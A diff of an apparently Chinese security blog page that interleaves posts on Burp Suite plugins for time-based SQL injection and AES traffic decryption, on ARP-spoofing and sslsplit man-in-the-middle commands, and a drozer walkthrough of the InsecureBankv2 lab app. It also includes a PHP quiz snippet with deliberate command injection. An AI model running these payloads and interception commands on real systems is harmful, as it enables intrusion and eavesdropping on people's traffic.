-        <a href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="基于burp插件的安全测试"><a href="#基于burp插件的安全测试" class="headerlink" title="基于burp插件的安全测试"></a>基于burp插件的安全测试</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>burp是很多web安全爱好者都会用到的神器，burp专业版集成了代理、fuzzing、重放、扫描等功能，对于自动化扫描功能来说，里面的poc都是官方集成好的，很难增加自己的特殊poc代码，最新版开放了burp的开发api，利用api可以很简单的集成自己的扫描poc，针对特定的站点进行针对性的扫描</p>
-<p>相对于其他扫描器，基于burp的自动化扫描可以不用考虑登入、cookie的处理问题，以及不用考虑爬虫爬不到的链接，只要你点击站点所有的页面后，burp的代理功能都会记录下请求来，设置不用考虑poc的插入位置问题，burp默认会对所有的位置进行poc的插入测试，连url里面的path路径都会涉及到。</p>
-<h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>burp在extender标签中，可以增加自己的插件代码，支持python、ruby、java，在测试中发现，java的效率是最高的，并且开发起来，在ide中导入jar包很容易开发，比起python、ruby还需要第三方插件的支持，并且效率比起java还是比较慢</p>
-<p>在BAPP Store中有很多开发好的插件代码，可以下载下来，安装后，在指定的目录下面会有相应的python代码或者jar包存在，这些都是很好的学习代码，推荐几个比较好用的插件：</p>
-<p>JSON Decoder，可以将json数据格式化，比较方便查看。</p>
-<p>Active Scan++ 增加了一些本身自动化扫描没有的漏洞检查。</p>
-<p>在APIs中是burp提供的api接口，自己没有接触过java代码，看起来比较费劲，可以先不用管他，可以在编写插件的时候了解到怎么使用和功能等等。</p>
-<p>下面的save，可以将这些api文件保存起来，后面编写java代码直接调用相应的接口</p>
-<p>Options里面是一些设置，主要是设置一些运行环境，比如你想用python写插件的话，就需要安装jython第三方包了</p>
-<h4 id="sql注入插件开发"><a href="#sql注入插件开发" class="headerlink" title="sql注入插件开发"></a>sql注入插件开发</h4><p>开发插件使用的是IDEA，创建一个新工程，创建一个新的package，注意这里命名为burp，将我们下载好的api包导入这个package中，后面需要创建插件的主要代码程序，这里还需要注意，这个代码文件的命名需要是BurpExtender，这个是必须的。</p>
-<p>这里我们做一个基于时间延时的sql注入扫描，sqlmap里面也有，但是sqlmap跑起来太慢，burp的自动化扫描，针对时间的sql注入扫描并不是很好用，poc比较少。</p>
-<p>由于我们这个插件主要做的就是把参数后面增加poc或者替换参数值为poc再去访问，判断执行时间是否有延时</p>
-<p>看了Active Scan++的源码，在IScannerCheck接口中有自动化的扫描函数：doActiveScan，并且会自动化的把poc插入到每一个测试点中，我们做的就是把poc给他，然后访问，看访问执行到访问结束的时间</p>
-<p>给出简单代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>, <span class="title">IScannerCheck</span></span>&#123;</div><div class="line">  <span class="comment">//实现IScannerCheck的doActiveScan</span></div><div class="line">  <span class="comment">// 实现IBurpExtender的registerExtenderCallbacks，来注册插件</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span></span>&#123;</div><div class="line">      <span class="comment">//注册插件，使burp可以加载到我们的插件</span></div><div class="line">      payloads[xxx]=<span class="string">"*if(now()=sysdate() and 1=1,SLEEP(10),0)"</span>;</div><div class="line">      <span class="comment">//自己的payload列表，将自己的注入poc写在这里</span></div><div class="line">        <span class="keyword">this</span>.mcallbacks = callbacks;</div><div class="line">        stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</div><div class="line">        helpers = callbacks.getHelpers();</div><div class="line">        <span class="comment">//helpers非常有用，可以帮你处理很多东西，这个后续需要好好研究下</span></div><div class="line">        callbacks.setExtensionName(<span class="string">"FuckScan"</span>);</div><div class="line">        callbacks.registerScannerCheck(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="comment">// 上述代码就可以将自己的插件增加到burp里面了</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> List&lt;IScanIssue&gt; <span class="title">doActiveScan</span><span class="params">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> </span>&#123;</div><div class="line">      <span class="comment">// 这里重写doActiveScan，在自动话扫描的时候增加我们的扫描代码</span></div><div class="line">      <span class="comment">// baseRequestResponse 是IHttpRequestResponse类型，这个里面包含了当前请求的所有信息，包括request和response信息</span></div><div class="line">      <span class="comment">// insertionPoint 是插入点，里面可以自动设置只在哪个位置进行插入测试，测试过程中发现代码有问题，只好全部扫描了</span></div><div class="line">      String value = insertionPoint.getBaseValue(); <span class="comment">//这个是先取下插入点的参数值，有的poc需要的是增加在原有的参数值后面生效的</span></div><div class="line">      SqlScanner(baseRequestResponse,insertionPoint,value);<span class="comment">//将当前的页面信息，插入点，和原有参数值传递到sql注入扫描中</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SqlScanner</span><span class="params">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint,String value)</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(payload.contains(<span class="string">"*"</span>))&#123;<span class="comment">//在poc中进行设置，主要出现×的就直接用poc测试，没有出现的用原有值增加poc测试</span></div><div class="line">            payload_byte = payload.getBytes();<span class="comment">//这里注意所有的操作，都是基于byte类型基础上的，需要进行转化处理</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            payload_byte = (value + payload).getBytes();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">byte</span>[] checkRequest = insertionPoint.buildRequest(payload_byte);<span class="comment">//这里是创建新的request，主要是将poc加入的重新生成一个request</span></div><div class="line"></div><div class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();<span class="comment">//记录当前时间</span></div><div class="line"></div><div class="line">        IHttpRequestResponse checkqeuestResponse = <span class="keyword">this</span>.mcallbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);</div><div class="line">        <span class="comment">// 这个是带poc去请求，我不管正常的请求时间，只需要知道这个request运行了多少时间</span></div><div class="line">        <span class="comment">// getHttpService，返回的是包含现在所有http服务请求的object</span></div><div class="line">        <span class="comment">// makeHttpRequest 是使用checkRequest并重新请求获取服务器的响应</span></div><div class="line">        <span class="comment">//为了减少误报，这里采用了两次请求的方法，结果比一次好些</span></div><div class="line">        <span class="comment">// <span class="doctag">TODO:</span>需要判断下原请求的时间，过程中还是发现不少误报</span></div><div class="line"></div><div class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();<span class="comment">//记录请求结束时间</span></div><div class="line">        <span class="keyword">if</span> (runtime &gt; <span class="number">9000</span>)&#123;<span class="comment">//poc中做的都是延时10秒，若有sql注入时间会出现比较大的延时</span></div><div class="line">          stdout.println(<span class="string">"[SQL注入成功:]"</span>);</div><div class="line">          stdout.println(helpers.bytesToString(checkRequest));<span class="comment">//在log中打印此次请求的request</span></div><div class="line">          <span class="comment">//<span class="doctag">TODO:</span>后续利用IScanIssue增加到burp的扫描结果中</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这就是基于time延时的扫描插件，很简单的几行代码就能结合burp本身的优势将我们的poc增加到自动化扫描里面</p>
-<p>我自己结合cloudeye增加了命令执行的检查，简单的用curl，将当前有命令执行的请求传递到cloudeye的日志里面，测试过程中发现见有几个产生了dns请求，没有执行curl，没有访问日志</p>
-<h4 id="AES加解密插件开发"><a href="#AES加解密插件开发" class="headerlink" title="AES加解密插件开发"></a>AES加解密插件开发</h4><p>在测试的过程中还需要一个问题，很多android在数据传输的时候对数据进行了加密处理，在测试的时候没有办法增加自己的poc来对进行测试，但是反编译app能发现AES的私钥硬编码在app中<br>这样可以在流量通过burp的时候对流量进行解密再增加poc再加密发送出去进行测试</p>
-<p>这个大牛们写过这方面的文章，自己也是在参考他们的基础上完成的。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>, <span class="title">IHttpListener</span>, <span class="title">IMessageEditorTabFactory</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//初始化使用的对象</span></div><div class="line">    <span class="keyword">private</span> IBurpExtenderCallbacks callbacks;</div><div class="line">    <span class="keyword">private</span> IExtensionHelpers helpers;</div><div class="line">    <span class="keyword">private</span> PrintWriter stdout;</div><div class="line">    <span class="keyword">private</span> String skey = <span class="string">"FL5LCBJL3JN534JC"</span>; <span class="comment">//AES私钥</span></div><div class="line">    <span class="keyword">private</span> String IV = <span class="string">"E68CFL7BK8KCCG6N"</span>;<span class="comment">//AES IV</span></div><div class="line"></div><div class="line">    <span class="comment">//注册插件</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</div><div class="line">        stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</div><div class="line">        <span class="keyword">this</span>.callbacks = callbacks;</div><div class="line">        helpers = callbacks.getHelpers();</div><div class="line">        callbacks.setExtensionName(<span class="string">"AES encrypt java edition"</span>);</div><div class="line">        callbacks.registerHttpListener(<span class="keyword">this</span>);<span class="comment">//为下面的processHttpMessage 注册,否则下面的方法不能使用</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</div><div class="line">      <span class="comment">//这个是对IHttpListener的方法改写，The listener will be notified of requests and responses made by any Burp tool.</span></div><div class="line">      <span class="comment">// toolFlag 是来定义那些请求是需要进行处理的。不同的参数值代表burp的不同位置</span></div><div class="line">      <span class="comment">// messageIsRequest 消息是否是请求包</span></div><div class="line">      <span class="comment">// messageInfo 包内容</span></div><div class="line">      <span class="keyword">if</span> (toolFlag == <span class="number">64</span> || toolFlag == <span class="number">16</span> || toolFlag == <span class="number">32</span> || toolFlag == <span class="number">4</span>) &#123;</div><div class="line">      <span class="comment">//不同的toolflag代表不同的burp组件,16:scanner;64:repeater;32:interuder;4:proxy</span></div><div class="line">      <span class="comment">//详情查看:https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks</span></div><div class="line">      <span class="keyword">if</span> (messageIsRequest) &#123;<span class="comment">//请求包</span></div><div class="line">          IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);<span class="comment">//利用helper自动处理请求包</span></div><div class="line">          List&lt;String&gt; headers = analyzeRequest.getHeaders();<span class="comment">//获取请求头列表</span></div><div class="line">          List&lt;IParameter&gt; paraList = analyzeRequest.getParameters();<span class="comment">//获取参数列表,参数分为三类:URL\COOKIE\BODY</span></div><div class="line">          <span class="keyword">byte</span>[] new_Request = messageInfo.getRequest();</div><div class="line">          <span class="keyword">for</span> (IParameter para : paraList) &#123;<span class="comment">//循环获取参数,判断类型,进行加密处理后,再构造新的参数,合并到请求包中</span></div><div class="line">            <span class="keyword">if</span> ((para.getType() == <span class="number">0</span> || para.getType() == <span class="number">1</span>) &amp;&amp; !paraWhiteList.contains(para.getName())) &#123;<span class="comment">//通过type来判断参数位于那个位置,</span></div><div class="line">                <span class="comment">// cookie是不需要处理的</span></div><div class="line">                String key = para.getName();</div><div class="line">                String value = para.getValue();</div><div class="line">                aesvalue = aes.encrypt(skey, IV, value);</div><div class="line">                aesvalue = helpers.urlEncode(aesvalue);</div><div class="line"><span class="comment">//                                    aesvalue = URLEncoder.encode(aesvalue, "UTF-8");//进行url编码</span></div><div class="line"><span class="comment">//                                    stdout.println("[ENCODE:]" + key + ":" + value + ":" + aesvalue); //输出到extender的UI窗口</span></div><div class="line">                IParameter newPara = helpers.buildParameter(key, aesvalue, para.getType());<span class="comment">//构造新的请求参数</span></div><div class="line">                new_Request = helpers.updateParameter(new_Request, newPara);<span class="comment">//构造新的请求包</span></div><div class="line">                messageInfo.setRequest(new_Request);<span class="comment">//设置最新的请求包</span></div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          <span class="keyword">else</span> &#123;<span class="comment">//处理返回的响应包，就是把返回的响应进行解密后展示出来，设计到几个api中的函数，看名称应该知道什么意思了</span></div><div class="line">              IResponseInfo anaylyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());</div><div class="line">              List&lt;String&gt; header = anaylyzeResponse.getHeaders();</div><div class="line">              <span class="keyword">short</span> statusCode = anaylyzeResponse.getStatusCode();</div><div class="line">              <span class="keyword">int</span> badyOffset = anaylyzeResponse.getBodyOffset();</div><div class="line">              AESOperator aes = <span class="keyword">new</span> AESOperator();</div><div class="line">              String resp = <span class="keyword">new</span> String(messageInfo.getResponse());</div><div class="line">              String body = resp.substring(badyOffset);</div><div class="line">              String debody = aes.decrypt(skey, IV, body);</div><div class="line">              debody = debody.replace(<span class="string">"\""</span>, <span class="string">"\\\""</span>);</div><div class="line">              String UnicodeBody = (<span class="keyword">new</span> CharSetUtil()).decodeUnicode(debody);</div><div class="line">              String newBody = UnicodeBody;</div><div class="line">              <span class="keyword">byte</span>[] bodybyte = newBody.getBytes();</div><div class="line">              messageInfo.setResponse(helpers.buildHttpMessage(header, bodybyte));</div></pre></td></tr></table></figure>
-<p>这个AES的加解密插件只要针对不同的加密密钥更改就行，可以很方面的解密出app中传递的参数，有的app还有增加sign校验值，只要反编译app获取算法后一样可以增加到插件中，这样就能对加密和增加校验值的进行web测试了</p>
-<h4 id="插件扫描结果"><a href="#插件扫描结果" class="headerlink" title="插件扫描结果"></a>插件扫描结果</h4><p>在测试新浪的服务的时候，直接打开自动扫描，可以把burp内置的扫描关闭掉，这样速度还是可以的，只要浏览sina的页面，插件自动进行扫描，结果发现sina的两处sql注入问题，这个要感谢川神的支持</p>
-<p><img src="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/1.png" alt="sql注入"><br><img src="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/2.png" alt="sql注入"></p>
-<p>当然测试中针对不同的网站特定进行手工的测试，总结出通用的poc之后加入到插件中去，直接在访问页面的时候就可以发现漏洞了</p>
-<p>AES加解密的插件，利用起来可以查看一个乌云的一个案例<a href="http://www.2cto.com/Article/201607/528201.html" target="_blank" rel="external">Zealer_android客户端安全检测</a></p>
-<h4 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h4><ol>
-<li><p>学习java代码，优化插件</p>
-</li>
-<li><p>增加更多的扫描插件，需要更对测试，获取每个网站业务特定漏洞poc，后续可以集成到自己的一个插件框架下面，在burp下面增加可以增加poc的输入框。</p>
-</li>
+<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
+<blockquote>
+<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
+<ol>
+<li>ARP欺骗</li>
 </ol>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>自己在java方面算是入门级别，这些也都是是参考各位大牛的基础上写的，过程中感觉很大一部分简单的知道java调用就行，主要是api的使用，当然会java的应该会编写出更加牛叉的测试插件，burp是个神器，在神器作为平台开发插件可以介绍很多工作量和避免很多坑。</p>
-<p>有很多的神器都是提供插件的集成的，网页浏览chrome本身就是一个框架，可以自己写chrome插件，端口扫描神器nmap也可以自定义插件扫描，移动安全方面，android hook方面有xposed框架，应用安全检测方面有drozer框架，自己开发插件集成可以玩出很多花样。</p>
-<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>以下代码可能存在什么问题？</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	extract($_POST);</div><div class="line"></div><div class="line">	<span class="comment">// 輸入淨化</span></div><div class="line">	<span class="keyword">if</span> (!mb_detect_encoding($p1, <span class="string">'UTF-8'</span>, <span class="keyword">true</span>) &amp;&amp; !mb_detect_encoding($p1, <span class="string">'big5'</span>, <span class="keyword">true</span>)) &#123;</div><div class="line">	    <span class="keyword">die</span>(<span class="string">"funny how a melody sounds like a memory"</span>);</div><div class="line">	&#125;</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\\\\"</span>, <span class="string">"\\\\"</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\""</span>,<span class="string">"\\\""</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\\$"</span>, <span class="string">"\\$"</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"`"</span>, <span class="string">"\\`"</span>, $p1);</div><div class="line"></div><div class="line">	<span class="comment">// 記錄日誌</span></div><div class="line">	exec_sql(<span class="string">"INSERT INTO iface_log (content, data) VALUES(?, ?)"</span>, <span class="string">"ss"</span>, <span class="string">"Remote interface called"</span>, json_encode(<span class="keyword">array</span>(<span class="string">'p1'</span>=&gt;$p1, <span class="string">'p2'</span>=&gt;$p2)));</div><div class="line"></div><div class="line">	<span class="comment">// 執行轉換</span></div><div class="line">	system(<span class="string">"timeout 2 /scripts/convert.sh reverse \"$p1\""</span>);</div></pre></td></tr></table></figure>
+<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
+<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
+<ol>
+<li>直接建立热点</li>
+</ol>
+<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
+<ol>
+<li>使用SSLsplit进行</li>
+</ol>
+<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
+<ol>
+<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
+</ol>
 
       
 
@@ -1077,7 +1179,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/">展开全文 >></a>
+          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
         </p>
       
 
@@ -1165,141 +1267,9 @@
 
 
   
-    <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">drozer测试InsecureBankv2</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/移动安全/drozer测试InsecureBankv2/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>测试app包名：com.android.insecurebankv2</p>
-<h3 id="intent-sniffer-数据嗅探"><a href="#intent-sniffer-数据嗅探" class="headerlink" title="intent sniffer(数据嗅探)"></a>intent sniffer(数据嗅探)</h3><ul>
-<li>利用app.broadcast.sniff 模块    </li>
-</ul>
-<p>首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name</p>
-<p>利用run app.broadcast.sniff –action theBroadcast 进行嗅探  </p>
-<p>结果获取到修改的密码信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Broadcast receiver registered to sniff matching intents</div><div class="line">[*] Output is updated once a second. Press Control+C to exit.</div><div class="line">Action: theBroadcast</div><div class="line">Raw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;</div><div class="line">Extra: newpass=Dinesh@123! (java.lang.String)</div><div class="line">Extra: phonenumber=15555215554 (java.lang.String)</div></pre></td></tr></table></figure></p>
-<ul>
-<li>代码层次：</li>
-</ul>
-<p>获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播</p>
-<h3 id="登入绕过"><a href="#登入绕过" class="headerlink" title="登入绕过"></a>登入绕过</h3><ul>
-<li><p>可查看manifast文件查找exported=“true”的activity名称</p>
-</li>
-<li><p>可以直接使用drozer activity模块查找暴露出的activity</p>
-</li>
-</ul>
-<p>测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面</p>
-<h3 id="备份安全测试"><a href="#备份安全测试" class="headerlink" title="备份安全测试"></a>备份安全测试</h3><ul>
-<li><p>可查看manifast文件查看是否允许备份allowBackup=”true”</p>
-</li>
-<li><p>可利用drozer模块：run app.package.backup -f insecurebankv2查看  </p>
-</li>
-</ul>
-<p>测试：  </p>
-<p>在当前目录下备份，在当前目录下会产生backup.ab 文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb backup -apk-shared com.android.insecurebankv2</div></pre></td></tr></table></figure>
-<ul>
-<li>读取该文件，后面可以看到登入账户的所有信息</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功)</div></pre></td></tr></table></figure>
-<h3 id="jdb调试app程序"><a href="#jdb调试app程序" class="headerlink" title="jdb调试app程序"></a>jdb调试app程序</h3><ul>
-<li><p>使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid）</p>
-</li>
-<li><p>使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上</p>
-</li>
-<li><p>使用jdb -attach localhost:1111 链接调试端口，进行调试   </p>
-</li>
-</ul>
-<p>测试：  </p>
-<p>实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来  </p>
-<p>本来为rooted，直接更改为 not rooted  </p>
-<p>可能用到的命令：  </p>
-<blockquote>
-<p>class：查看所有用到的包名<br>methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin<br>直接在showRootStatus()方法上下断点，jdb主要命令<br>step – 执行当前行<br>step up – 执行到当前方法返回到其调用程序<br>stepi – 执行当前指令<br>next – 跳过一行（跨过调用）<br>cont – 从断点处继续执行  </p>
-</blockquote>
-<p>运行过程中，观察locals的本地变量  </p>
-<p>出现变量：isrooted=true，利用set isrooted=false进行变量设置  </p>
-<p>run运行，发现提示变为未root  </p>
-<h3 id="hack-广播接受者-恶意发送短信"><a href="#hack-广播接受者-恶意发送短信" class="headerlink" title="hack 广播接受者,恶意发送短信"></a>hack 广播接受者,恶意发送短信</h3><ul>
-<li>run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action</li>
-</ul>
-<p>在反编译代码中查找该reveicer</p>
-<p>本例中代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context paramContext, Intent paramIntent)</div><div class="line">&#123;</div><div class="line">Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);</div><div class="line">paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);</div><div class="line">并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信</div></pre></td></tr></table></figure>
-<p>触发这个的reveicer的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">private void broadcastChangepasswordSMS(String paramString1, String paramString2)</div><div class="line">&#123;</div><div class="line">if (TextUtils.isEmpty(paramString1.toString().trim()))</div><div class="line">&#123;</div><div class="line">System.out.println(&quot;Phone number Invalid.&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">Intent localIntent = new Intent();</div><div class="line">localIntent.setAction(&quot;theBroadcast&quot;);</div><div class="line">localIntent.putExtra(&quot;phonenumber&quot;, paramString1);</div><div class="line">localIntent.putExtra(&quot;newpass&quot;, paramString2);</div><div class="line">sendBroadcast(localIntent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li>直接调用am命令：</li>
-</ul>
